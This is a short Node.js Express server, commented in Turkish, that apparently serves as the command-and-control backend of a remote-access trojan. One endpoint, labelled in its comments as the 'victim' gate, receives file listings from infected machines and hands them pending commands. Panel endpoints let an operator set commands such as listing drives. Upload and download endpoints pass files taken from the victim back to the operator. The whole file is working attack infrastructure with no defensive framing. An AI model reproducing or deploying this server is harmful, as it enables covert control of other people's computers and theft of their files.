const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

let database = {
    fileList: [],
    currentPath: "Bilgisayarım",
    lastUpdate: "Veri bekleniyor...",
    pendingCommand: "GET_DRIVES"
};

let tempFileStorage = { fileName: "", data: null };

app.get('/', (req, res) => res.send("AdminUlan Server Aktif!"));

// Client (Kurban) Kapısı
app.all('/agent', (req, res) => {
    if (req.method === 'POST') {
        database.fileList = req.body.files || [];
        database.currentPath = req.body.currentPath || "Bilgisayarım";
        database.lastUpdate = new Date().toLocaleString('tr-TR');
    }
    res.json({ command: database.pendingCommand });
});

// Panel Veri Kapısı
app.get('/panel', (req, res) => res.json(database));

// Panel Komut Kapısı
app.all('/panel/command', (req, res) => {
    if (req.method === 'POST') {
        database.pendingCommand = req.body.command;
        return res.json({ status: "Success" });
    }
    res.json({ currentCommand: database.pendingCommand });
});

// Dosya Transfer Kapıları
app.post('/upload', (req, res) => {
    tempFileStorage = { fileName: req.body.fileName, data: req.body.data };
    database.pendingCommand = "IDLE";
    res.json({ status: "OK" });
});

app.get('/download-file', (req, res) => res.json(tempFileStorage));

app.listen(PORT, () => console.log(`Server ${PORT} üzerinde çalışıyor.`));
